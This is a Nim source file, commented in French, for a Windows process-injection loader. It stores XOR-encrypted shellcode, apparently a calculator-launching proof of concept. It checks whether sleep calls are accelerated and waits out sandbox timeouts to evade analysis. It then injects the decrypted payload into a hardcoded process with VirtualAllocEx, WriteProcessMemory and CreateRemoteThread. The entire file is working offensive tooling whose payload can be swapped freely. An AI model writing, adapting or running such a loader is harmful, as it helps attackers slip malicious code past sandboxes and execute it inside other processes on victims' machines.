import winim/lean
import strformat
import times

# Clé XOR pour le déchiffrement
const XOR_KEY: byte = 0xAA

# Shellcode chiffré avec XOR (clé 0xAA)
let encryptedBuf: array[296, byte] = [
  byte 0x56,0xE2,0x29,0x4E,0x5A,0x42,0x6A,0xAA,0xAA,0xAA,0xEB,
  0xFB,0xEB,0xFA,0xF8,0xFB,0xFC,0xE2,0x9B,0x78,0xCF,0xE2,
  0x21,0xF8,0xCA,0xE2,0x21,0xF8,0xB2,0xE2,0x21,0xF8,0x8A,
  0xE2,0x21,0xD8,0xFA,0xE2,0xA5,0x1D,0xE0,0xE0,0xE7,0x9B,
  0x63,0xE2,0x9B,0x6A,0x06,0x96,0xCB,0xD6,0xA8,0x86,0x8A,
  0xEB,0x6B,0x63,0xA7,0xEB,0xAB,0x6B,0x48,0x47,0xF8,0xEB,
  0xFB,0xE2,0x21,0xF8,0x8A,0x21,0xE8,0x96,0xE2,0xAB,0x7A,
  0x21,0x2A,0x22,0xAA,0xAA,0xAA,0xE2,0x2F,0x6A,0xDE,0xCD,
  0xE2,0xAB,0x7A,0xFA,0x21,0xE2,0xB2,0xEE,0x21,0xEA,0x8A,
  0xE3,0xAB,0x7A,0x49,0xFC,0xE2,0x55,0x63,0xEB,0x21,0x9E,
  0x22,0xE2,0xAB,0x7C,0xE7,0x9B,0x63,0xE2,0x9B,0x6A,0x06,
  0xEB,0x6B,0x63,0xA7,0xEB,0xAB,0x6B,0x92,0x4A,0xDF,0x5B,
  0xE6,0xA9,0xE6,0x8E,0xA2,0xEF,0x93,0x7B,0xDF,0x72,0xF2,
  0xEE,0x21,0xEA,0x8E,0xE3,0xAB,0x7A,0xCC,0xEB,0x21,0xA6,
  0xE2,0xEE,0x21,0xEA,0xB6,0xE3,0xAB,0x7A,0xEB,0x21,0xAE,
  0x22,0xE2,0xAB,0x7A,0xEB,0xF2,0xEB,0xF2,0xF4,0xF3,0xF0,
  0xEB,0xF2,0xEB,0xF3,0xEB,0xF0,0xE2,0x29,0x46,0x8A,0xEB,
  0xF8,0x55,0x4A,0xF2,0xEB,0xF3,0xF0,0xE2,0x21,0xB8,0x43,
  0xFD,0x55,0x55,0x55,0xF7,0xE2,0x10,0xAB,0xAA,0xAA,0xAA,
  0xAA,0xAA,0xAA,0xAA,0xE2,0x27,0x27,0xAB,0xAB,0xAA,0xAA,
  0xEB,0x10,0x9B,0x21,0xC5,0x2D,0x55,0x7F,0x11,0x4A,0xB7,
  0x80,0xA0,0xEB,0x10,0x0C,0x3F,0x17,0x37,0x55,0x7F,0xE2,
  0x29,0x6E,0x82,0x96,0xAC,0xD6,0xA0,0x2A,0x51,0x4A,0xDF,
  0xAF,0x11,0xED,0xB9,0xD8,0xC5,0xC0,0xAA,0xF3,0xEB,0x23,
  0x70,0x55,0x7F,0xE9,0x90,0xF6,0xDD,0xC3,0xC4,0xCE,0xC5,
  0xDD,0xD9,0xF6,0xD9,0xD3,0xD9,0xDE,0xCF,0xC7,0x99,0x98,
  0xF6,0xC9,0xCB,0xC6,0xC9,0x84,0xCF,0xD2,0xCF,0xAA]

# Fonction de déchiffrement XOR
proc xorDecrypt(data: openArray[byte], key: byte): seq[byte] =
  result = newSeq[byte](data.len)
  for i in 0..<data.len:
    result[i] = data[i] xor key

# Fonction anti-sandbox simple
proc sleepCheck() =
  echo "[*] Performing sleep check..."
  let start = epochTime()
  sleep(3000)  # Sleep 3 secondes
  let elapsed = epochTime() - start
  
  # Si le temps écoulé est beaucoup moins que prévu, c'est probablement une sandbox
  if elapsed < 2.5:
    echo "[!] Sandbox detected (sleep acceleration). Exiting."
    quit(0)
  echo "[+] Sleep check passed"

proc main() =
  echo "[*] Starting process injection..."
  
  # Anti-sandbox: vérification du sleep
  sleepCheck()
  
  # Attendre un peu pour dépasser les timeouts des sandbox
  echo "[*] Waiting to bypass sandbox timeout..."
  sleep(5000)
  
  # Déchiffrer le shellcode
  echo "[*] Decrypting payload..."
  let buf = xorDecrypt(encryptedBuf, XOR_KEY)
  echo fmt"[+] Decrypted {buf.len} bytes"
  
  # PID du processus cible
  let processId: DWORD = 10128
  
  # Ouvrir le processus
  echo fmt"[*] Opening process with PID: {processId}"
  let pHandle = OpenProcess(PROCESS_ALL_ACCESS, false, processId)
  if pHandle == 0:
    echo "[!] Failed to open process"
    quit(1)
  defer: CloseHandle(pHandle)
  echo fmt"[+] Got handle: 0x{pHandle.toHex()}"
  
  # Allouer de la mémoire dans le processus distant
  echo "[*] Allocating memory in remote process..."
  let rPtr = VirtualAllocEx(
    pHandle, 
    NULL, 
    cast[SIZE_T](buf.len), 
    MEM_COMMIT, 
    PAGE_EXECUTE_READ_WRITE
  )
  
  if rPtr == nil:
    echo "[!] VirtualAllocEx failed"
    quit(1)
  echo fmt"[+] Allocated memory at: 0x{cast[int](rPtr).toHex()}"
  
  # Écrire le shellcode déchiffré
  echo "[*] Writing payload to remote process..."
  var bytesWritten: SIZE_T
  let wSuccess = WriteProcessMemory(
    pHandle, 
    rPtr, 
    unsafeAddr buf[0], 
    cast[SIZE_T](buf.len), 
    addr bytesWritten
  )
  
  if not bool(wSuccess):
    echo "[!] WriteProcessMemory failed"
    quit(1)
  echo fmt"[+] Written {bytesWritten} bytes"
  
  # Créer un thread distant pour exécuter le shellcode
  echo "[*] Creating remote thread..."
  let tHandle = CreateRemoteThread(
    pHandle, 
    NULL, 
    0, 
    cast[LPTHREAD_START_ROUTINE](rPtr), 
    NULL, 
    0, 
    NULL
  )
  
  if tHandle == 0:
    echo "[!] CreateRemoteThread failed"
    quit(1)
  defer: CloseHandle(tHandle)
  echo fmt"[+] Thread created with handle: 0x{tHandle.toHex()}"
  
  echo "[+] Payload injected successfully!"
  echo "[*] Press Enter to exit..."
  discard stdin.readLine()

when isMainModule:
  main()

